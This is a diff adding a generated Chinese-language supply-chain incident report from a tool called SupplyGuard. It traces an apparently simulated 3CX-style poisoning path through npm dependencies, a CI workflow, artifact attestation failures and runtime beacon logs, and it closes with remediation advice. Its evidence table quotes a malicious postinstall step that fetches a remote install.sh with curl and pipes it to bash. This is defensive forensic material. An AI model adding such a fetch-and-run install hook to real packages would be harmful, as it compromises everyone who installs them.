@@ -1,0 +1,378 @@
+<!doctype html>
+<html lang="zh-CN">
+<head><meta charset="utf-8"><title>SupplyGuard KG 溯源报告</title>
+<style>body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;max-width:980px;margin:40px auto;line-height:1.7;color:#0f172a}h1,h2,h3{line-height:1.3}.bullet{margin-left:1rem}code{background:#f1f5f9;padding:2px 4px;border-radius:4px}</style>
+</head><body>
+<h1>知识图谱驱动的真实攻击路径研判报告</h1>
+
+<p>生成时间：2026-06-13 17:34:41 UTC</p>
+
+<h2>风险摘要</h2>
+
+<p class="bullet">• 综合风险评分：100 / 100</p>
+<p class="bullet">• 风险等级：critical</p>
+<p class="bullet">• 打开风险：36 项，其中严重风险 20 项</p>
+<p class="bullet">• 图谱节点：207 个</p>
+<p class="bullet">• 图谱关系：332 条</p>
+<p class="bullet">• 统一资产：176 个</p>
+<p class="bullet">• 证据片段：320 条</p>
+<p class="bullet">• 运行期日志事件：579 条</p>
+<p class="bullet">• 已识别攻击路径：4 条</p>
+<p class="bullet">• 可行动攻击路径：4 条</p>
+<p class="bullet">• 高度可信真实路径：1 条</p>
+<p class="bullet">• 平均路径置信度：73%</p>
+<p class="bullet">• 路径判定分布：cross-modal-corroborated-path=1, likely-real-attack-path=1, provenance-risk-path=2</p>
+<p class="bullet">• 参考模型：GUAC 软件树/证据树可达性、OpenCTI observable 关系与置信度、NetworkX 路径评分、in-toto/SLSA 可信证据链、BloodHound 式入口到目标路径呈现</p>
+
+<h2>路径判定</h2>
+
+<p>本报告不再只列“发现了哪些漏洞”，而是判断这些证据能否串成一次真实攻击路径。</p>
+
+<h2>攻击路径</h2>
+
+<h3>1. 多模态证据印证供应链投毒到运行期异常路径</h3>
+
+<p>一句话结论：OCR/ASR 多模态证据、规则命中、依赖/构建关系和运行期日志相互印证，能串成跨模态高可信供应链攻击路径，综合置信度 90%。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;VisualEvidence: cicd-error.png&quot;]</p>
+<p>  N2[&quot;MultimodalFinding: 截图或语音中出现安装脚本外联&quot;]</p>
+<p>  N3[&quot;RecognizedEntity: package:@acme/payments-helper&quot;]</p>
+<p>  N4[&quot;DependencyPackage: npm:axios@1.6.8&quot;]</p>
+<p>  N5[&quot;CIStep: 运行期证据关联&quot;]</p>
+<p>  N6[&quot;BuildArtifact: 3cx-desktop-app.tar.gz&quot;]</p>
+<p>  N7[&quot;RuntimeService: checkout-api.prod&quot;]</p>
+<p>  N8[&quot;LogEvent: 45.83.64.12&quot;]</p>
+<p>  N9[&quot;AttackStage: 供应链投毒阶段&quot;]</p>
+<p>  N1 --&gt;|触发规则| N2</p>
+<p>  N2 --&gt;|关联实体| N3</p>
+<p>  N3 --&gt;|可进入构建| N4</p>
+<p>  N4 --&gt;|可进入构建| N5</p>
+<p>  N5 --&gt;|生成产物| N6</p>
+<p>  N6 --&gt;|产生日志| N7</p>
+<p>  N7 --&gt;|产生日志| N8</p>
+<p>  N8 --&gt;|关联| N9</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：cross-modal-corroborated-path</p>
+<p class="bullet">• 综合置信度：90%</p>
+<p class="bullet">• 严重级别：critical</p>
+<p class="bullet">• 路径评分：100 / 100</p>
+<p class="bullet">• 影响资产：cicd-error.png -&gt; package:@acme/payments-helper -&gt; npm:axios@1.6.8 -&gt; 运行期证据关联 -&gt; 3cx-desktop-app.tar.gz -&gt; checkout-api.prod -&gt; 45.83.64.12</p>
+<p class="bullet">• 修复优先级：P0</p>
+<p class="bullet">• 攻击映射：software/evidence tree correlation, observable confidence and relationship graph, path scoring and source diversity</p>
+<p class="bullet">• 参考模型：GUAC, OpenCTI, NetworkX, Sigma, Wazuh</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• cicd-error.png --触发规则--&gt; 截图或语音中出现安装脚本外联（Sigma/Wazuh，置信度 90%）：Sigma-style multimodal rule matched recognized text from this evidence source.</p>
+<p class="bullet">• 截图或语音中出现安装脚本外联 --影响资产--&gt; package:@acme/payments-helper（FINDING_AFFECTS，置信度 86%）：Finding references the normalized asset by asset_id.</p>
+<p class="bullet">• package:@acme/payments-helper --关联--&gt; npm:axios@1.6.8（evidence，置信度 50%）：Regex/Keyword Entity Extraction</p>
+<p class="bullet">• npm:axios@1.6.8 --可进入构建--&gt; 运行期证据关联（GUAC，置信度 72%）：A poisoned dependency can run install-time behavior or influence generated artifacts.</p>
+<p class="bullet">• 运行期证据关联 --生成产物--&gt; 3cx-desktop-app.tar.gz（SLSA/in-toto，置信度 78%）：A compromised step or builder can produce a modified artifact.</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz --deployed as--&gt; checkout-api.prod（Runtime deployment，置信度 82%）：Workspace runtime metadata links the verified artifact to the deployed service.</p>
+<p class="bullet">• checkout-api.prod --产生日志--&gt; 45.83.64.12（Runtime evidence，置信度 84%）：Runtime logs show whether the build-time risk manifested after deployment.</p>
+<p class="bullet">• 45.83.64.12 --关联--&gt; 供应链投毒阶段（evidence，置信度 50%）：NormalizedLogEvent</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• GUAC：软件树中存在可达依赖节点；主体=npm:axios@1.6.8；状态=observed</p>
+<p class="bullet">• in-toto：构建步骤将 material 转换为 product；主体=运行期证据关联；状态=needs-attestation</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=3cx-desktop-app.tar.gz；状态=gap</p>
+<p class="bullet">• Runtime evidence：运行期行为证明风险可能已经触发；主体=45.83.64.12；状态=observed</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 当前路径未发现明显证据缺口。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• npm:axios@1.6.8：固定私有源、锁定版本并清理缓存包。</p>
+<p class="bullet">• 运行期证据关联：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz：重新构建并校验产物哈希/provenance。</p>
+<p class="bullet">• checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。</p>
+<p class="bullet">• 45.83.64.12：封禁相关来源/目的地址并扩大同时间窗排查。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：3cx-desktop-app.tar.gz sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716; repo=https://github.c...</p>
+<p class="bullet">• artifact_digest_matches_subject：fail: artifact sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716 != attestation subject sha256:...</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：pass: attestation age is 55.58 hours</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/actions/runner/self-hosted</p>
+
+<h3>2. 证据可串成供应链投毒到运行期异常的攻击路径</h3>
+
+<p>一句话结论：能串成一次高度可信的真实攻击路径：入口、构建、产物、运行期行为连续可达，综合置信度 85%。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;CodeFile: cases/3cx-supply-chain/sample-repo/.github/workflows/desktop-release.y&quot;]</p>
+<p>  N2[&quot;DependencyPackage: npm:axios@1.6.8&quot;]</p>
+<p>  N3[&quot;CIStep: 运行期证据关联&quot;]</p>
+<p>  N4[&quot;BuildArtifact: 3cx-desktop-app.tar.gz&quot;]</p>
+<p>  N5[&quot;RuntimeService: checkout-api.prod&quot;]</p>
+<p>  N6[&quot;LogEvent: 45.83.64.12&quot;]</p>
+<p>  N7[&quot;AttackStage: 供应链投毒阶段&quot;]</p>
+<p>  N1 --&gt;|声明依赖入口| N2</p>
+<p>  N2 --&gt;|可进入构建| N3</p>
+<p>  N3 --&gt;|生成产物| N4</p>
+<p>  N4 --&gt;|deployed as| N5</p>
+<p>  N5 --&gt;|产生日志| N6</p>
+<p>  N6 --&gt;|关联| N7</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：likely-real-attack-path</p>
+<p class="bullet">• 综合置信度：85%</p>
+<p class="bullet">• 严重级别：critical</p>
+<p class="bullet">• 路径评分：100 / 100</p>
+<p class="bullet">• 影响资产：cases/3cx-supply-chain/sample-repo/.github/workflows/desktop-release.yml -&gt; npm:axios@1.6.8 -&gt; 运行期证据关联 -&gt; 3cx-desktop-app.tar.gz -&gt; checkout-api.prod -&gt; 45.83.64.12</p>
+<p class="bullet">• 修复优先级：P0</p>
+<p class="bullet">• 攻击映射：T1195</p>
+<p class="bullet">• 参考模型：GUAC, SLSA, in-toto, BloodHound CE, MITRE ATT&amp;CK STIX</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• cases/3cx-supply-chain/sample-repo/.github/workflows/desktop-release.yml --声明依赖入口--&gt; npm:axios@1.6.8（GUAC，置信度 62%）：If the package is malicious or vulnerable, it can be selected during dependency resolution.</p>
+<p class="bullet">• npm:axios@1.6.8 --可进入构建--&gt; 运行期证据关联（GUAC，置信度 72%）：A poisoned dependency can run install-time behavior or influence generated artifacts.</p>
+<p class="bullet">• 运行期证据关联 --生成产物--&gt; 3cx-desktop-app.tar.gz（SLSA/in-toto，置信度 78%）：A compromised step or builder can produce a modified artifact.</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz --deployed as--&gt; checkout-api.prod（Runtime deployment，置信度 82%）：Workspace runtime metadata links the verified artifact to the deployed service.</p>
+<p class="bullet">• checkout-api.prod --产生日志--&gt; 45.83.64.12（Runtime evidence，置信度 84%）：Runtime logs show whether the build-time risk manifested after deployment.</p>
+<p class="bullet">• 45.83.64.12 --关联--&gt; 供应链投毒阶段（evidence，置信度 50%）：NormalizedLogEvent</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• GUAC：软件树中存在可达依赖节点；主体=npm:axios@1.6.8；状态=observed</p>
+<p class="bullet">• in-toto：构建步骤将 material 转换为 product；主体=运行期证据关联；状态=needs-attestation</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=3cx-desktop-app.tar.gz；状态=gap</p>
+<p class="bullet">• Runtime evidence：运行期行为证明风险可能已经触发；主体=45.83.64.12；状态=observed</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 当前路径未发现明显证据缺口。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• npm:axios@1.6.8：固定私有源、锁定版本并清理缓存包。</p>
+<p class="bullet">• 运行期证据关联：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz：重新构建并校验产物哈希/provenance。</p>
+<p class="bullet">• checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。</p>
+<p class="bullet">• 45.83.64.12：封禁相关来源/目的地址并扩大同时间窗排查。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：3cx-desktop-app.tar.gz sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716; repo=https://github.c...</p>
+<p class="bullet">• artifact_digest_matches_subject：fail: artifact sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716 != attestation subject sha256:...</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：pass: attestation age is 55.58 hours</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/actions/runner/self-hosted</p>
+
+<h3>3. 证据可串成构建链路完整性受损路径</h3>
+
+<p>一句话结论：能串成构建完整性风险路径，但还需要 provenance/attestation 才能证明产物确被篡改，综合置信度 68%。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;CIStep: .github/workflows/desktop-release.yml&quot;]</p>
+<p>  N2[&quot;BuildArtifact: 3cx-desktop-app.tar.gz&quot;]</p>
+<p>  N3[&quot;RuntimeService: checkout-api.prod&quot;]</p>
+<p>  N4[&quot;AttackStage: 构建链路风险阶段&quot;]</p>
+<p>  N1 --&gt;|deployed as| N2</p>
+<p>  N2 --&gt;|deployed as| N3</p>
+<p>  N3 --&gt;|关联| N4</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：provenance-risk-path</p>
+<p class="bullet">• 综合置信度：68%</p>
+<p class="bullet">• 严重级别：high</p>
+<p class="bullet">• 路径评分：95 / 100</p>
+<p class="bullet">• 影响资产：.github/workflows/desktop-release.yml -&gt; 3cx-desktop-app.tar.gz -&gt; checkout-api.prod</p>
+<p class="bullet">• 修复优先级：P1</p>
+<p class="bullet">• 攻击映射：Build provenance and integrity</p>
+<p class="bullet">• 参考模型：SLSA, in-toto, GUAC, BloodHound CE</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• .github/workflows/desktop-release.yml --关联--&gt; 3cx-desktop-app.tar.gz（evidence，置信度 50%）：WorkspaceSummary</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz --deployed as--&gt; checkout-api.prod（Runtime deployment，置信度 82%）：Workspace runtime metadata links the verified artifact to the deployed service.</p>
+<p class="bullet">• checkout-api.prod --关联--&gt; 构建链路风险阶段（evidence，置信度 50%）：Runtime</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• in-toto：构建步骤将 material 转换为 product；主体=.github/workflows/desktop-release.yml；状态=needs-attestation</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=3cx-desktop-app.tar.gz；状态=gap</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 路径关系可达，但部分边是启发式关联；建议补充时间线、产物哈希或来源 IP 证据。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• .github/workflows/desktop-release.yml：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz：重新构建并校验产物哈希/provenance。</p>
+<p class="bullet">• checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：3cx-desktop-app.tar.gz sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716; repo=https://github.c...</p>
+<p class="bullet">• artifact_digest_matches_subject：fail: artifact sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716 != attestation subject sha256:...</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：pass: attestation age is 55.58 hours</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/actions/runner/self-hosted</p>
+
+<h3>4. 产物可信链路验证路径</h3>
+
+<p>一句话结论：产物 3cx-desktop-app.tar.gz 的可信链存在阻断项；需要复核 commit 2222222222222222222222222222222222222222 -&gt; workflow -&gt; https://github.com/actions/runner/self-hosted -&gt; artifact -&gt; attestation 的 digest、签名和策略匹配结果。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;SourceCommit: commit 2222222222222222222222222222222222222222&quot;]</p>
+<p>  N2[&quot;TrustedBuilder: https://github.com/actions/runner/self-hosted&quot;]</p>
+<p>  N3[&quot;BuildArtifact: 3cx-desktop-app.tar.gz&quot;]</p>
+<p>  N4[&quot;Attestation: 3cx-desktop-app.tar.gz&quot;]</p>
+<p>  N5[&quot;Finding: 产物 digest 与 attestation subject 不一致或缺失&quot;]</p>
+<p>  N6[&quot;AttackStage: 构建链路风险阶段&quot;]</p>
+<p>  N1 --&gt;|produces artifact| N2</p>
+<p>  N2 --&gt;|produces artifact| N3</p>
+<p>  N3 --&gt;|attested by| N4</p>
+<p>  N4 --&gt;|blocks proof| N5</p>
+<p>  N5 --&gt;|关联| N6</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：provenance-risk-path</p>
+<p class="bullet">• 综合置信度：50%</p>
+<p class="bullet">• 严重级别：critical</p>
+<p class="bullet">• 路径评分：16 / 100</p>
+<p class="bullet">• 影响资产：commit 2222222222222222222222222222222222222222 -&gt; https://github.com/actions/runner/self-hosted -&gt; 3cx-desktop-app.tar.gz -&gt; 3cx-desktop-app.tar.gz</p>
+<p class="bullet">• 修复优先级：P0</p>
+<p class="bullet">• 攻击映射：Verify artifact provenance</p>
+<p class="bullet">• 参考模型：SLSA, in-toto, Sigstore Cosign, GitHub Artifact Attestations, GUAC</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• commit 2222222222222222222222222222222222222222 --关联--&gt; https://github.com/actions/runner/self-hosted（evidence，置信度 50%）：SLSA/in-toto</p>
+<p class="bullet">• https://github.com/actions/runner/self-hosted --produces artifact--&gt; 3cx-desktop-app.tar.gz（SLSA provenance，置信度 88%）：Trusted builder identity is the execution root that produced the artifact subject digest.</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz --attested by--&gt; 3cx-desktop-app.tar.gz（SLSA/in-toto，置信度 92%）：Artifact trust scan parsed a provenance attestation for this artifact digest.</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz --blocks proof--&gt; 产物 digest 与 attestation subject 不一致或缺失（SLSA/in-toto policy，置信度 90%）：Artifact trust finding blocks or weakens the provenance proof chain.</p>
+<p class="bullet">• 产物 digest 与 attestation subject 不一致或缺失 --关联--&gt; 构建链路风险阶段（evidence，置信度 50%）：SLSA/in-toto</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• SLSA materials：source repository and commit/ref are claimed by provenance；主体=commit 2222222222222222222222222222222222222222；状态=observed</p>
+<p class="bullet">• -：-；主体=-；状态=-</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=3cx-desktop-app.tar.gz；状态=gap</p>
+<p class="bullet">• -：-；主体=-；状态=-</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 当前路径未发现明显证据缺口。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• 3cx-desktop-app.tar.gz：重新构建并校验产物哈希/provenance。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：3cx-desktop-app.tar.gz sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716; repo=https://github.c...</p>
+<p class="bullet">• artifact_digest_matches_subject：fail: artifact sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716 != attestation subject sha256:...</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：pass: attestation age is 55.58 hours</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/actions/runner/self-hosted</p>
+
+<h2>关联高危问题</h2>
+
+<p>| 编号 | 等级 | 评分 | 风险 | 影响资产 | 来源 |</p>
+<p>| --- | --- | ---: | --- | --- | --- |</p>
+<p>| finding-node:4ff9fbf702545b36 | critical | 100 | axios has exploitable VEX context | axios@1.6.8 | CycloneDX |</p>
+<p>| finding-node:81203073eb49d600 | critical | 100 | electron vulnerability needs reachability triage | electron@25.9.8 | CycloneDX |</p>
+<p>| finding-node:b2a34a1ebcecebd2 | critical | 100 | pip vulnerability needs reachability triage | pip@24.0.0 | CycloneDX |</p>
+<p>| finding-node:48eec593c42a7bcf | critical | 100 | setuptools vulnerability needs reachability triage | setuptools@65.5.0 | CycloneDX |</p>
+<p>| finding-node:13a9099d487713d0 | critical | 100 | starlette vulnerability needs reachability triage | starlette@1.0.0 | CycloneDX |</p>
+<p>| finding-node:ed122af851f5fda1 | critical | 98 | 产物 digest 与 attestation subject 不一致或缺失 | artifact_trust | SLSA/in-toto |</p>
+<p>| finding-node:e33b2b17a3bb2123 | critical | 97 | 依赖与 CI/CD 风险后出现运行期外联/敏感接口访问 | 证据链 | WorkspaceSummary |</p>
+<p>| finding-node:f13369fcf0078521 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:97aaa1dda7db9b21 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:fae7ec87f56d1cf1 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:88ab8ea49348d9fb | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:a1f8b27b61a1bf27 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+
+<h2>证据链</h2>
+
+<p>| 序号 | 时间 | 证据类型 | 关联资产 | 证据摘要 | 来源模型 |</p>
+<p>| ---: | --- | --- | --- | --- | --- |</p>
+<p>| 1 | 2026-06-13 17:34 | artifact-provenance | 3cx-desktop-app.tar.gz | 3cx-desktop-app.tar.gz sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716; repo=https://github.com/3cx/desktop-app; commit=222222222222222222222222222222222... | SLSA/in-toto |</p>
+<p>| 2 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | fail: artifact sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716 != attestation subject sha256:000000000000000000000000000000000000000000000000000000000000... | SLSA/in-toto |</p>
+<p>| 3 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | skipped: No historical hash baseline configured. | SLSA/in-toto |</p>
+<p>| 4 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | pass: attestation age is 55.58 hours | SLSA/in-toto |</p>
+<p>| 5 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | pass: https://github.com/actions/runner/self-hosted | SLSA/in-toto |</p>
+<p>| 6 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | fail: provenance commit 2222222222222222222222222222222222222222 does not match expected 8f42c19 | SLSA/in-toto |</p>
+<p>| 7 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | pass: https://slsa.dev/provenance/v1 | SLSA/in-toto |</p>
+<p>| 8 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | fail: self-hosted runner is not allowed by policy: self-hosted | SLSA/in-toto |</p>
+<p>| 9 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | warn: Error: HTTP 404: Not Found (https://api.github.com/repos/3cx/desktop-app/attestations/sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716?per_page=30&amp;p... | SLSA/in-toto |</p>
+<p>| 10 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | pass: https://github.com/3cx/desktop-app | SLSA/in-toto |</p>
+<p>| 11 | 2026-06-13 17:34 | artifact-trust-check | 3cx-desktop-app.tar.gz | pass: .github/workflows/desktop-release.yml | SLSA/in-toto |</p>
+<p>| 12 | 2026-06-13 17:34 | artifact-trust-finding | 3cx-desktop-app.tar.gz | self-hosted runner is not allowed by policy: self-hosted | SLSA/in-toto |</p>
+<p>| 13 | 2026-06-13 17:34 | artifact-trust-finding | 3cx-desktop-app.tar.gz | artifact sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716 != attestation subject sha256:0000000000000000000000000000000000000000000000000000000000000000 | SLSA/in-toto |</p>
+<p>| 14 | 2026-06-13 17:34 | artifact-trust-finding | 3cx-desktop-app.tar.gz | provenance commit 2222222222222222222222222222222222222222 does not match expected 8f42c19 | SLSA/in-toto |</p>
+<p>| 15 | 2026-06-13 17:34 | artifact-trust-finding | 3cx-desktop-app.tar.gz | Error: HTTP 404: Not Found (https://api.github.com/repos/3cx/desktop-app/attestations/sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716?per_page=30&amp;predica... | SLSA/in-toto |</p>
+<p>| 16 | 2026-06-13 17:33 | static-analysis-result | cases/3cx-supply-chain/sample-repo/.github/workflows/desktop-release.yml | permissions: write-all | SARIF |</p>
+<p>| 17 | 2026-06-13 17:34 | sbom-component-risk | npm:axios@1.6.8 | OSV: GHSA-35jp-ww65-95wh; OSV: GHSA-3g43-6gmg-66jw; OSV: GHSA-3p68-rc4w-qgx5; OSV: GHSA-3w6x-2g7m-8v23; OSV: GHSA-43fc-jf86-j433; OSV: GHSA-445q-vr5w-6q77; OSV: GHSA-4hjh-wcwx-x... | CycloneDX |</p>
+<p>| 18 | 2026-06-11 11:30:02 | runtime-log-finding | 45.83.64.12 | {&quot;time&quot;:&quot;2026-06-11T11:30:02Z&quot;,&quot;source&quot;:&quot;app&quot;,&quot;host&quot;:&quot;customer-pc-01&quot;,&quot;process&quot;:&quot;3cx-desktop-app&quot;,&quot;event&quot;:&quot;...pp beacon egress destination 45.83.64.12 for cdn-update.example.inv... | NormalizedLogEvent |</p>
+
+<h2>多模态证据融合</h2>
+
+<p class="bullet">• 多模态证据：18 条</p>
+<p class="bullet">• 安全实体：118 个</p>
+<p class="bullet">• 规则命中：22 条</p>
+<p class="bullet">• 多模态风险：critical / 96</p>
+<p class="bullet">• 参考模型：GUAC 负责软件供应链可达关系，OpenCTI 负责 observable/置信度/first seen 语义，NetworkX 负责路径评分和多源证据连通性。</p>
+
+<p>| Evidence ID | 类型 | 风险 | 关联实体 | 命中规则 | 识别文本摘要 |</p>
+<p>| --- | --- | --- | --- | --- | --- |</p>
+<p>| MME-20260611120040129581-DDC20BBF | image | low / 0 | - | - | - |</p>
+<p>| MME-20260605112212515224-D40CCA7A | image | critical / 96 | @acme/payments-helper@9.9.2, postinstall, curl, 185.199.108.153, 凌晨三点, checkout-api, 异常外联, 外联 | multimodal-postinstall-egress, multimodal-sensitive-interface-anomaly | npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，... |</p>
+<p>| MME-20260605112203250782-DDC20BBF | image | low / 0 | - | - | - |</p>
+<p>| MME-20260603143717219602-DDC20BBF | image | low / 0 | - | - | - |</p>
+<p>| MME-20260603080139438792-D40CCA7A | image | critical / 96 | @acme/payments-helper@9.9.2, postinstall, curl, 185.199.108.153, 凌晨三点, checkout-api, 异常外联, 外联 | multimodal-postinstall-egress, multimodal-sensitive-interface-anomaly | npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，... |</p>
+<p>| MME-20260603080102092971-B4A4919E | image | high / 84 | 凌晨三点, checkout-api, 异常外联, 外联, 185.199.108.153, admin/export | multimodal-sensitive-interface-anomaly | SupplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export... |</p>
+<p>| MME-20260603080052880859-DDC20BBF | image | critical / 96 | 09:42:10, @acme/payments-helper@9.9.2, @acme/payments-helper, postinstall, curl, bash, 185.199.108.153 | multimodal-postinstall-egress | GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/paymen... |</p>
+<p>| MME-20260603080050377411-4A1F3B72 | audio | low / 0 | - | - | 凌晨3. 赤烤雷批爱出现一场外连 atmean export 接口访问两声高 请隔离购劲产务 并负合 provenance |</p>
+
+<h2>修复建议</h2>
+
+<p class="bullet">• **P0 · 多模态证据印证供应链投毒到运行期异常路径**：优先封堵 OCR/ASR 中识别到的依赖包、外联 IP 和敏感接口，并把同时间窗的 CI/CD、SBOM、运行日志作为取证材料保留。</p>
+<p class="bullet">• **P0 · 证据可串成供应链投毒到运行期异常的攻击路径**：隔离高危依赖，使用干净 runner 重新构建，校验产物哈希，并排查运行期外联。</p>
+<p class="bullet">• **P1 · 证据可串成构建链路完整性受损路径**：收敛 workflow 权限，第三方 Action 固定到 commit SHA，并为产物增加 provenance/attestation。</p>
+<p class="bullet">• **P0 · 产物可信链路验证路径**：将该产物可信验证结果作为发布门禁；digest、签名、builder、workflow 或来源任一失败时阻断发布。</p>
+
+<h2>附录</h2>
+
+<h3>SBOM / Dependency-Track 风险摘要</h3>
+
+<p class="bullet">• SBOM 组件数量：59</p>
+<p class="bullet">• 依赖风险数量：5</p>
+<p class="bullet">• 最高依赖风险：100 / 100</p>
+<p class="bullet">• VEX statement：58</p>
+<p class="bullet">• VEX affected / under investigation：17</p>
+<p class="bullet">• VEX not affected / fixed：41</p>
+<p class="bullet">• 代码可达依赖：2</p>
+<p class="bullet">• 运行期日志命中：8</p>
+
+<h3>SARIF / DefectDojo 风险摘要</h3>
+
+<p class="bullet">• SARIF 结果数量：4</p>
+<p class="bullet">• 代码风险数量：1</p>
+<p class="bullet">• CI/CD 风险数量：3</p>
+
+<h3>产物可信验证摘要</h3>
+
+<p class="bullet">• 产物：3cx-desktop-app.tar.gz</p>
+<p class="bullet">• SHA256：sha256:b2d7cb6c3a9209112502583c24802e57d115579c2cc9ed3bfffa716e4d0d7716</p>
+<p class="bullet">• 可信评分：16 / 100</p>
+<p class="bullet">• 检查项数量：10</p>
+<p class="bullet">• 产物可信风险：4</p>
+
+<h3>日志证据摘要</h3>
+
+<p class="bullet">• 日志风险数量：2</p>
+<p class="bullet">• 图谱证据数量：320</p>
+
+<h3>开源参考</h3>
+
+<p class="bullet">• GUAC: https://docs.guac.sh/guac/</p>
+<p class="bullet">• GUAC Ontology: https://docs.guac.sh/guac/guac-ontology/</p>
+<p class="bullet">• MITRE ATT&amp;CK STIX Data: https://github.com/mitre-attack/attack-stix-data</p>
+<p class="bullet">• SLSA: https://slsa.dev/spec/v1.2/provenance</p>
+<p class="bullet">• in-toto: https://github.com/in-toto/in-toto</p>
+<p class="bullet">• BloodHound CE: https://specterops.io/bloodhound-community-edition/</p>
+<p class="bullet">• NetworkX: https://networkx.org/</p>
